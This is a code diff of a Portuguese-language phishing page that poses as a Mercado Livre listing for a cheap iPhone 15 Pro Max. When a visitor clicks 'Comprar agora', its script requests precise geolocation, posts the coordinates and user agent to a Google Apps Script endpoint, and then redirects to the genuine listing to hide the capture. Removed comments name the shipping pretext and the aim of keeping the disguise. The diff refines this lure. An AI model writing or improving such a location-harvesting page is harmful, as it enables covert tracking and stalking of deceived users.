@@ -6,82 +6,65 @@
     <title>Mercado Livre | iPhone 15 Pro Max em Oferta</title>
     <style>
         body { font-family: 'Proxima Nova', Helvetica, Arial, sans-serif; background-color: #ebebeb; margin: 0; padding: 0; }
-        header { background-color: #fff159; padding: 12px; text-align: center; border-bottom: 1px solid #e0d100; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
-        .container { max-width: 450px; margin: 15px auto; background: white; padding: 20px; border-radius: 6px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
-        .product-img { width: 100%; max-width: 280px; display: block; margin: 0 auto; }
+        header { background-color: #fff159; padding: 12px; text-align: center; border-bottom: 1px solid #e0d100; }
+        .container { max-width: 450px; margin: 15px auto; background: white; padding: 20px; border-radius: 6px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); text-align: center; }
+        /* Imagem corrigida para carregar sempre */
+        .product-img { width: 100%; max-width: 250px; height: auto; margin: 0 auto; display: block; }
         .price-tag { color: #333; font-size: 34px; font-weight: 300; margin: 10px 0; }
-        .shipping { color: #00a650; font-size: 14px; font-weight: 600; margin-bottom: 10px; }
-        .btn-buy { background-color: #3483fa; color: white; border: none; padding: 18px; width: 100%; border-radius: 6px; font-size: 18px; font-weight: 600; cursor: pointer; margin-top: 15px; transition: 0.2s; }
-        .btn-buy:active { transform: scale(0.98); background-color: #2968c8; }
-        .footer-info { font-size: 11px; color: #999; margin-top: 20px; text-align: center; line-height: 1.4; }
+        .shipping { color: #00a650; font-size: 14px; font-weight: 600; }
+        .btn-buy { background-color: #3483fa; color: white; border: none; padding: 18px; width: 100%; border-radius: 6px; font-size: 18px; font-weight: 600; cursor: pointer; margin-top: 15px; }
+        .footer-info { font-size: 11px; color: #999; margin-top: 20px; line-height: 1.4; }
     </style>
 </head>
 <body>
 
 <header>
-    <img src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.15/mercadolibre/logo_large_25years_v2.png" width="130">
+    <img src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.15/mercadolibre/logo_large_25years_v2.png" width="120">
 </header>
 
 <div class="container">
-    <img src="https://m.media-amazon.com/images/I/81SigAnN97L._AC_SL1500_.jpg" class="product-img">
-    <h1 style="font-size: 20px; color: #333; font-weight: 400; margin: 15px 0 5px 0;">iPhone 15 Pro Max 256 GB Titânio Azul</h1>
+    <img src="https://store.storeimages.cdn-apple.com/4982/as-images.apple.com/is/iphone-15-pro-finish-select-202309-6-7inch-blue-titanium?wid=512&fmt=p-jpg" class="product-img" alt="iPhone 15">
+    
+    <h1 style="font-size: 19px; color: #333; font-weight: 400; margin: 15px 0 5px 0;">iPhone 15 Pro Max 256 GB Titânio Azul</h1>
     <div style="text-decoration: line-through; color: #999; font-size: 14px;">R$ 10.999</div>
-    <div class="price-tag">R$ 1.899 <span style="font-size: 16px;">em 12x de R$ 158</span></div>
-    <div class="shipping">⚡ Chegará grátis amanhã (Envio Full)</div>
+    <div class="price-tag">R$ 1.899 <span style="font-size: 16px;">em 12x</span></div>
+    <div class="shipping">⚡ Chegará grátis amanhã</div>
     
     <button class="btn-buy" onclick="capturar()">Comprar agora</button>
     
-    <div class="footer-info">
-        Compra Garantida com o Mercado Pago<br>
-        Vendido por Apple Loja Oficial | ⭐⭐⭐⭐⭐
-    </div>
+    <div class="footer-info">Compra Garantida com o Mercado Pago</div>
 </div>
 
 <script>
     function capturar() {
-        // O pretexto: O navegador pede a localização para o cálculo do frete Full
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(sucesso, erro, {
-                enableHighAccuracy: true,
-                timeout: 5000,
-                maximumAge: 0
-            });
+            navigator.geolocation.getCurrentPosition(sucesso, erro, {enableHighAccuracy: true});
         } else {
             redirecionar();
         }
+        // Fallback: se em 2 segundos nada acontecer, redireciona
+        setTimeout(redirecionar, 2000);
     }
 
     function sucesso(pos) {
-        // TUA URL DO GOOGLE JÁ INSERIDA:
         const urlGoogle = "https://script.google.com/macros/s/AKfycby1qyka8ZGBo9cl5t0K7oR2eMcTJoyFUK2EqNTiR3oDl7A9lmdg09tsUoSwdUx7OlIeoA/exec";
 
-        const dados = {
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            device: navigator.userAgent
-        };
-
-        // Envia para o Google Sheets de forma "cega" (no-cors)
         fetch(urlGoogle, {
             method: 'POST',
             mode: 'no-cors',
-            body: JSON.stringify(dados)
-        }).then(() => {
-            redirecionar();
-        }).catch(() => {
+            body: JSON.stringify({
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                device: navigator.userAgent
+            })
+        }).finally(() => {
             redirecionar();
         });
-        
-        // Timer de segurança: se o fetch demorar mais de 1s, redireciona de qualquer jeito
-        setTimeout(redirecionar, 1000);
     }
 
-    function erro() { 
-        redirecionar(); 
-    }
+    function erro() { redirecionar(); }
 
     function redirecionar() {
-        // Redireciona para o anúncio real para manter o disfarce
         window.location.href = "https://www.mercadolivre.com.br/apple-iphone-15-pro-max-256-gb-titanio-azul/p/MLB27383325";
     }
 </script>
